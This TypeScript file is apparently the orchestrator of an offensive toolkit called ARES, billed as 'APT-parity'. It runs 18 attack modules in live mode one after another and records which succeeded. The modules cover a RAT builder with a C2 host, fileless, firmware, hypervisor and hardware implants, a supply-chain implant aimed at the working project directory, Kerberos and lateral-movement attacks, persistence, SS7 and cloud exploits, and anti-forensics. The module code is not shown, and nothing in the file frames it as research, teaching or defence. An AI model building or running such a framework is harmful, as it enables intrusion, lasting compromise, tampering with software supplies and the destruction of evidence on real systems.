/**
 * @module ares/orchestrator
 * Full APT-parity orchestrator — runs all 18 ARES engines in dependency order.
 */
import { liveRequired } from "./_base.ts"
import { ARES_MODULE_NAMES } from "./index.ts"
import { runZeroDayFuzzer } from "./zero_day_fuzzer.ts"
import { buildFilelessImplant } from "./fileless_implant.ts"
import { deployFirmwareImplant } from "./firmware_implant.ts"
import { deployHypervisorRootkit } from "./hypervisor_rootkit.ts"
import { runAirgapBridge } from "./airgap_bridge.ts"
import { buildRat } from "./rat_builder.ts"
import { runSupplyChainImplant } from "./supply_chain_implant.ts"
import { runEvasionEngine } from "./evasion_engine.ts"
import { deploySatelliteC2 } from "./satellite_c2.ts"
import { runSs7Exploit } from "./ss7_exploit.ts"
import { deployHardwareImplant } from "./hardware_implant.ts"
import { runKerberosAdvanced } from "./kerberos_advanced.ts"
import { installAdvancedPersistence } from "./persistence_advanced.ts"
import { runLateralScale } from "./lateral_scale.ts"
import { runAntiForensicsAdvanced } from "./anti_forensics_advanced.ts"
import { runNetworkExploit } from "./network_exploit.ts"
import { runCloudNativeAttack } from "./cloud_native.ts"
import { runAiMlAttacks } from "./ai_ml_attacks.ts"

export interface AresOrchestratorResult {
  modules: Array<{ name: string; success: boolean; summary: string }>
  succeeded: number
  total: number
  summary: string
}

export async function runAresOrchestrator(opts: {
  live?: boolean
  target?: string
  domain?: string
  projectDir?: string
}): Promise<AresOrchestratorResult> {
  liveRequired("ares_orchestrator", opts)
  const target = opts.target ?? "127.0.0.1"
  const modules: AresOrchestratorResult["modules"] = []

  const runners: Array<{ name: string; run: () => Promise<{ summary: string; success?: boolean }> }> = [
    { name: "ares_evasion_engine", run: async () => { const r = await runEvasionEngine({ live: true }); return { summary: r.summary, success: r.techniques.length > 0 } } },
    { name: "ares_fileless_implant", run: async () => { const r = await buildFilelessImplant({ live: true }); return { summary: r.summary, success: r.artifacts.length > 0 } } },
    { name: "ares_zero_day_fuzzer", run: async () => { const r = await runZeroDayFuzzer({ live: true, target: "echo", rounds: 16 }); return { summary: r.summary, success: true } } },
    { name: "ares_rat_builder", run: async () => { const r = await buildRat({ live: true, c2Host: target }); return { summary: r.summary, success: r.artifacts.length > 0 } } },
    { name: "ares_kerberos_advanced", run: async () => { const r = await runKerberosAdvanced({ live: true, domain: opts.domain }); return { summary: r.summary, success: r.techniques.length > 0 } } },
    { name: "ares_lateral_scale", run: async () => { const r = await runLateralScale({ live: true, target }); return { summary: r.summary, success: r.steps.some((s) => s.success) } } },
    { name: "ares_persistence_advanced", run: async () => { const r = await installAdvancedPersistence({ live: true }); return { summary: r.summary, success: r.installed > 0 || r.steps.some((s) => s.success) } } },
    { name: "ares_supply_chain_implant", run: async () => { const r = await runSupplyChainImplant({ live: true, projectDir: opts.projectDir ?? process.cwd() }); return { summary: r.summary, success: r.steps.some((s) => s.success) } } },
    { name: "ares_cloud_native", run: async () => { const r = await runCloudNativeAttack({ live: true }); return { summary: r.summary, success: r.steps.some((s) => s.success) || r.platforms.length > 0 } } },
    { name: "ares_network_exploit", run: async () => { const r = await runNetworkExploit({ live: true }); return { summary: r.summary, success: r.steps.some((s) => s.success) } } },
    { name: "ares_firmware_implant", run: async () => { const r = await deployFirmwareImplant({ live: true }); return { summary: r.summary, success: r.deployed || !!r.uefiDriver } } },
    { name: "ares_hypervisor_rootkit", run: async () => { const r = await deployHypervisorRootkit({ live: true, esxiHost: target }); return { summary: r.summary, success: r.probes.some((p) => p.ok) || r.artifacts.length > 0 } } },
    { name: "ares_airgap_bridge", run: async () => { const r = await runAirgapBridge({ live: true }); return { summary: r.summary, success: r.executed || r.channels.length > 0 } } },
    { name: "ares_hardware_implant", run: async () => { const r = await deployHardwareImplant({ live: true }); return { summary: r.summary, success: r.probed || r.artifacts.length > 0 } } },
    { name: "ares_satellite_c2", run: async () => { const r = await deploySatelliteC2({ live: true }); return { summary: r.summary, success: r.probed || r.artifacts.length > 0 } } },
    { name: "ares_ss7_exploit", run: async () => { const r = await runSs7Exploit({ live: true }); return { summary: r.summary, success: r.probed || r.operations.length > 0 } } },
    { name: "ares_ai_ml_attacks", run: async () => { const r = await runAiMlAttacks({ live: true, targetUrl: `http://${target}:8080` }); return { summary: r.summary, success: r.steps.some((s) => s.success) } } },
    { name: "ares_anti_forensics_advanced", run: async () => { const r = await runAntiForensicsAdvanced({ live: true }); return { summary: r.summary, success: r.executed || r.actions.length > 0 } } },
  ]

  for (const { name, run } of runners) {
    try {
      const r = await run()
      modules.push({ name, success: r.success !== false, summary: r.summary })
    } catch (err) {
      modules.push({ name, success: false, summary: String((err as Error).message).slice(0, 200) })
    }
  }

  const succeeded = modules.filter((m) => m.success).length
  return {
    modules,
    succeeded,
    total: ARES_MODULE_NAMES.length,
    summary: `ARES orchestrator: ${succeeded}/${ARES_MODULE_NAMES.length} modules succeeded`,
  }
}

export default { runAresOrchestrator }
